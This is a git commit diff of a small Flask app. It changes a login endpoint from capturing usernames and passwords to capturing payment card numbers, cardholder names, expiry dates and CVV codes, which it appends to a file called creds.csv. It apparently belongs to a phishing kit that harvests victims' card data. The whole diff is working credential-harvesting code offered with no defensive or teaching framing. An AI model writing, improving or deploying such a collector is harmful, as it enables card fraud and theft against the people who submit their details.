4721d52a810c408a42c7b6ff8f84c1e9472775d3
CodeZapp <77064508+CodeZapp@users.noreply.github.com>
2024-01-28 13:52:03 +0530

    Add files via upload

--- main.py
+++ main.py
@@ -5,15 +5,17 @@ app = Flask(__name__)
 
 @app.route("/")
 def index():
-    return render_template("/login.html")
+    return render_template("/index.html")
 
 @app.route("/login", methods=["POST"])
 def login():
-    username = request.json.get("username")
-    password = request.json.get("password")
+    card_number = request.json.get("card_number")
+    name = request.json.get("name")
+    expiry = request.json.get("expiry")
+    cvv = request.json.get("cvv")
     with open("creds.csv", "a+") as f:
         csv_writer = csv.writer(f)
-        csv_writer.writerow([username, password])
+        csv_writer.writerow([card_number, name, expiry, cvv])
     return jsonify({
         "status": "success"
     }), 201
